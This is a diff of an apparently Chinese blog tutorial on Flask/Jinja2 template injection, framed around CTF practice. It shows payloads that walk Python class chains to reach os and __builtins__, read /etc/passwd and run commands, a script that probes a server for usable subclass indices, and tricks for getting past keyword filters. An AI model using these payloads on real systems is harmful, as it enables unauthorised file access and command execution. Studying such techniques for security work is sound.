@@ -518,8 +518,9 @@
 <p><strong>网站模板引擎:</strong><br>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。<br>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。</p>
 </blockquote>
 <blockquote>
-<p>现行的模板引擎有:<br>PHP 的     Smarty, Twig, Blade.<br>Java 的    JSP, FreeMareker, Velocity.<br>Python 的  Flask(Jinja2), django, tornado<br>……</p>
+<p>现行的模板引擎有:<br>PHP 的     Smarty, Twig, Blade.<br>Java 的    JSP, FreeMareker, Velocity.<br>Python 的  Flask(Jinja2), django, tornado</p>
 </blockquote>
+<p>……</p>
 <p>简单来说，可以理解为利用模板引擎来生成前端的HTML代码。模板引擎会会提供一套生成HTML代码的程序，然后只需要获取用户的数据，将其放到渲染函数里，最后生成模板+用户数据的前端HTML页面，反馈给浏览器，从而呈现在用户面前。当这里的“用户的数据”具有恶意攻击性而又不被处理时，SSTI就发生了。</p>
 <h2 id="2、SSTI检测工具-Tplmap"><a href="#2、SSTI检测工具-Tplmap" class="headerlink" title="2、SSTI检测工具 Tplmap"></a>2、SSTI检测工具 Tplmap</h2><blockquote>
 <p>工具地址:<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>安装教程:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ktsm/p/15691652.html">https://www.cnblogs.com/ktsm/p/15691652.html</a><br>使用教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/EC_Carrot/article/details/109709767">https://blog.csdn.net/EC_Carrot/article/details/109709767</a></p>
@@ -532,16 +533,21 @@
 <h3 id="2、Python-类继承"><a href="#2、Python-类继承" class="headerlink" title="2、Python 类继承"></a>2、Python 类继承</h3><p>Python 中一切皆为对象，均继承于 object 对象，Python 中的 object 类中集成了很多的基础函数，假如需要在 payload 中使用某个函数就需要用 object 去操作。</p>
 <p>常见的<strong>继承关系</strong>有以下三种：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. base ：对象的一个基类，一般是object</span><br><span class="line">2. mro  ：获取对象的基类，只是这时会显示整个继承链的关系，是一个列表，而object在最列表的最顶层，通过mro[-1]可以获取到</span><br><span class="line">3. subclasses() : 继承此对象的子类，返回一个列表</span><br></pre></td></tr></table></figure>
+
 <h2 id="Ⅱ-构造payload"><a href="#Ⅱ-构造payload" class="headerlink" title="Ⅱ. 构造payload"></a>Ⅱ. 构造payload</h2><br>
 
 <p><strong>攻击方式为：变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量</strong></p>
 <h3 id="1、相关属性"><a href="#1、相关属性" class="headerlink" title="1、相关属性"></a>1、相关属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">对于返回的是类实例：</span><br><span class="line">1. __class__            //返回实例的对象，可以使实例指向class，从而使用下面的魔术方法</span><br><span class="line">如：</span><br><span class="line">&gt;&gt;&gt;&#x27;&#x27;.__class__  </span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line">对于返回的是定义的class类：</span><br><span class="line">2. __base__              //返回类的父亲 python3</span><br><span class="line">3. __mro__               //返回类继承的元组，即寻找父类 python3</span><br><span class="line">4. __subclasses__()      //返回类中仍然可用的引用，可以此获取想要的类的对象 python3</span><br><span class="line">如：</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138]  </span><br><span class="line">&lt;class &#x27;os._wrap_close&#x27;&gt;   </span><br><span class="line">Tip：根据索引值来获取想用的可利用类,不加索引会输出全部存活的引用</span><br><span class="line"></span><br><span class="line">5. __builtins__          //作为默认初始模块出现，可用于查看当前所有导入的内建函数</span><br><span class="line">6. __globals__           //对包含函数全局变量的字典的引用。如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量 python3</span><br><span class="line">7. __init__              //返回类的初始化方法</span><br><span class="line">如：</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[38].__init__</span><br><span class="line">&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;</span><br><span class="line">Tip: &#x27;wrapper&#x27;是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br></pre></td></tr></table></figure>
+
 <h3 id="2、一个简单的payload寻找过程"><a href="#2、一个简单的payload寻找过程" class="headerlink" title="2、一个简单的payload寻找过程"></a>2、一个简单的payload寻找过程</h3><h4 id="Ⅰ-找到-globals-全局"><a href="#Ⅰ-找到-globals-全局" class="headerlink" title="Ⅰ. 找到__globals__全局"></a>Ⅰ. 找到<code>__globals__</code>全局</h4><p>根据上述属性，找到重载过的 <code>__init__</code> 类（在获取初始化属性后，带 <code>wrapper</code> 的说明没有重载，因此寻找**<code>不带 warpper</code>** 的即可），并通过 <code>__globals__</code> 全局来查找所有的方法及变量及参数，或者获取 <code>file</code> 、 <code>os</code> 等模块以进行下一步的利用。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__</span><br><span class="line">&lt;function _wrap_close.__init__ at 0x0000025AA50BAEE0&gt;</span><br></pre></td></tr></table></figure>
+
 <h4 id="Ⅱ-查看其引用-builtins"><a href="#Ⅱ-查看其引用-builtins" class="headerlink" title="Ⅱ. 查看其引用__builtins__"></a>Ⅱ. 查看其引用<code>__builtins__</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;]            </span><br><span class="line">Tip：这里会返回 dict 类型，寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220915221230348-826204857.png"></p>
 <h4 id="Ⅲ-使用可利用函数实现文件读取功能等"><a href="#Ⅲ-使用可利用函数实现文件读取功能等" class="headerlink" title="Ⅲ. 使用可利用函数实现文件读取功能等"></a>Ⅲ. 使用可利用函数实现文件读取功能等</h4><p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read() </code></p>
 <h3 id="3、常用的目标函数"><a href="#3、常用的目标函数" class="headerlink" title="3、常用的目标函数"></a>3、常用的目标函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file</span><br><span class="line">subprocess.Popen</span><br><span class="line">os.popen</span><br><span class="line">exec</span><br><span class="line">eval</span><br></pre></td></tr></table></figure>
+
 <blockquote>
 <p>几个含有<code>eval</code>函数的类：<br>warnings.catch_warnings<br>WarningMessage<br>codecs.IncrementalEncoder<br>codecs.IncrementalDecoder<br>codecs.StreamReaderWriter<br>os._wrap_close<br>reprlib.Repr<br>weakref.finalize<br>……</p>
 </blockquote>
@@ -556,6 +562,7 @@
 <p>直接寻找 <code>os</code> 模块执行命令<br>先编写脚本遍历Python中含有os模块的类的索引号，然后选取其中一个构造payload执行命令，脚本如下：</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(500):</span><br><span class="line">    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    if &#x27;os.py&#x27; in res.text:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
 <br>
 
 <p>用例:</p>
@@ -567,32 +574,37 @@
 </blockquote>
 <p>【参考资料：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584#toc-17">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a>】</p>
 <h1 id="三、模板注入绕过"><a href="#三、模板注入绕过" class="headerlink" title="三、模板注入绕过"></a>三、模板注入绕过</h1><h2 id="1、语法"><a href="#1、语法" class="headerlink" title="1、语法"></a>1、语法</h2><p>官方文档对于模板的部分语法介绍如下（仍然以jinja2为例：<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">Template Designer Documentation</a>）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">&#123;% ... %&#125; for Statements </span><br><span class="line">可用来声明变量，也可用以循环语句和条件语句</span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line">用于将表达式打印到模板输出</span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line">表示未包含在模板输出中的注释</span><br><span class="line">#  ... # for Line Statements</span><br><span class="line">## 可以有和 &#123;%%&#125; 相同的效果</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">You can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). --官方原文</span><br><span class="line">可以用 . 或者 [] 来访问变量的属性，也就是说</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;  等价于  &#123;&#123;&quot;&quot;[&#x27;__classs__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>1 基本语法</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements </span><br><span class="line">可用来声明变量，也可用以循环语句和条件语句</span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line">用于将表达式打印到模板输出</span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line">表示未包含在模板输出中的注释</span><br><span class="line">#  ... # for Line Statements</span><br><span class="line">## 可以有和 &#123;%%&#125; 相同的效果</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>2 dot(.)的绕过</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). --官方原文</span><br><span class="line">可以用 . 或者 [] 来访问变量的属性，也就是说</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;  等价于  &#123;&#123;&quot;&quot;[&#x27;__classs__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>因此，当<code>.</code>被过滤时，我们可以使用<code>[]</code>以绕过。</p>
 <blockquote>
-<ol start="3">
-<li>如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code></li>
-</ol>
+<p>3 如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code></p>
 </blockquote>
 <p>所以对于取<strong>字典中键值</strong>的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<ol start="4">
-<li>调用对象的方法，具体是调用了魔术方法<code>__getattribute__</code></li>
-</ol>
+<p>4 调用对象的方法，具体是调用了魔术方法<code>__getattribute__</code></p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure>
 <blockquote>
-<ol start="5">
-<li><strong><code>lipsum</code></strong><br><strong>flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：</strong></li>
-</ol>
+<p>5 <strong><code>lipsum</code></strong><br><strong>flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：</strong></p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">#在CTF中很好用</span><br></pre></td></tr></table></figure>
 <p>【参考资料：<a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/15/web-SSTI/">SSTI</a>】</p>
-<h2 id="2、绕过"><a href="#2、绕过" class="headerlink" title="2、绕过"></a>2、绕过</h2><h3 id="Ⅰ-字符串"><a href="#Ⅰ-字符串" class="headerlink" title="Ⅰ. 字符串"></a>Ⅰ. 字符串</h3><p>1、拼接<br><code>&quot;cla&quot;+&quot;ss&quot;</code><br>2、反转<br><code>&quot;__ssalc__&quot;[::-1]</code><br>3、编码绕过（ASCII码、Unicode编码等）<br>4、利用chr函数<br>因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他</p>
+<h2 id="2、绕过"><a href="#2、绕过" class="headerlink" title="2、绕过"></a>2、绕过</h2><h3 id="Ⅰ-字符串"><a href="#Ⅰ-字符串" class="headerlink" title="Ⅰ. 字符串"></a>Ⅰ. 字符串</h3><p>1、拼接<br><code>&quot;cla&quot;+&quot;ss&quot;</code></p>
+<p>2、反转<br><code>&quot;__ssalc__&quot;[::-1]</code></p>
+<p>3、编码绕过（ASCII码、Unicode编码等）<br>4、利用chr函数<br>因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;  //%2b为 + ，拼接字符串</span><br><span class="line">==&gt;&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 <p>5、在jinja2里面可以利用<code>~</code>进行拼接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 <p>6、大小写过滤转换</p>
 <h3 id="Ⅱ-过滤器"><a href="#Ⅱ-过滤器" class="headerlink" title="Ⅱ. 过滤器"></a>Ⅱ. 过滤器</h3><blockquote>
 <p>在模板中, 过滤器相当于一个函数, 把当前的变量传入到过滤器中, 然后过滤器根据自身功能, 再返回对应的值, 之后再把结果渲染到页面中<br>基本语法: <code>&#123;&#123; 变量 | 过滤器名称 &#125;&#125; </code>使用管道符号<code>|</code>进行组合，可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。</p>
@@ -601,14 +613,20 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1. attr</span><br><span class="line">#用于获取变量，可用于. [] 都被过滤的情况</span><br><span class="line">&quot;&quot;|attr(&quot;__class__&quot;) &lt;==&gt; &quot;&quot;.__class__</span><br><span class="line">2. format</span><br><span class="line">#格式化字符串</span><br><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)  </span><br><span class="line">&lt;==&gt;  </span><br><span class="line">&quot;__class__&quot;</span><br><span class="line">3. join</span><br><span class="line">#将一个序列拼接成一个字符串，join (&#x27;|&#x27;)将令每一个元素被&#x27;|&#x27;隔开</span><br><span class="line">&quot;&quot;[[&#x27;__clas&#x27;,&#x27;s__&#x27;]|join] 或者 &quot;&quot;[(&#x27;__clas&#x27;,&#x27;s__&#x27;)|join]</span><br><span class="line">&lt;==&gt;</span><br><span class="line">&quot;&quot;[&quot;__class__&quot;]</span><br><span class="line">4. lower</span><br><span class="line">#转换成小写</span><br><span class="line">5. replace</span><br><span class="line">#替换字符串</span><br><span class="line">&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;</span><br><span class="line">&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</span><br><span class="line">6. string</span><br><span class="line">#将变量转换为字符串，这样就可以通过浏览器显示的符号构造出我们可利用的字符串、符号等</span><br><span class="line">().__class__   出来的是&lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line">().__class__|string)[0] 出来的是&lt;</span><br><span class="line">7. list</span><br><span class="line">#转换成列表，可以与上面的string配合，就可以调用列表里面的方法取字符了</span><br><span class="line">(()|select|string|list).pop(0)</span><br></pre></td></tr></table></figure>
 <p>【资料查阅：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过（进阶篇）</a>】</p>
 <h3 id="Ⅲ-关键字绕过"><a href="#Ⅲ-关键字绕过" class="headerlink" title="Ⅲ. 关键字绕过"></a>Ⅲ. 关键字绕过</h3><ol>
-<li><code>.</code>和<code>[]</code><blockquote>
+<li><p><code>.</code>和<code>[]</code></p>
+<blockquote>
 <p>可用过滤器<code>attr</code>绕过，若<code>.</code>可用，还可以<code>__getitem__</code>绕过<code>[]</code>。</p>
 </blockquote>
 </li>
-<li><code>&quot;&quot;</code>和<code>_</code>绕过<blockquote>
-<p><code>request.args</code>、<code>request.values</code>、<code>request.cookies</code> 是 flask 中的属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来进而绕过了引号的过滤<br><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd </code><br><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ </code></p>
+<li><p><code>&quot;&quot;</code>和<code>_</code>绕过</p>
+<blockquote>
+<p><code>request.args</code>、<code>request.values</code>、<code>request.cookies</code> 是 flask 中的属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来进而绕过了引号的过滤</p>
 </blockquote>
 </li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd</span><br><span class="line">=&gt;</span><br><span class="line">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
 <li><code>&#123;&#123;&#125;&#125;</code>绕过<blockquote>
 <p>用<code>&#123;%%&#125;</code>的左半边绕过</p>
 </blockquote>
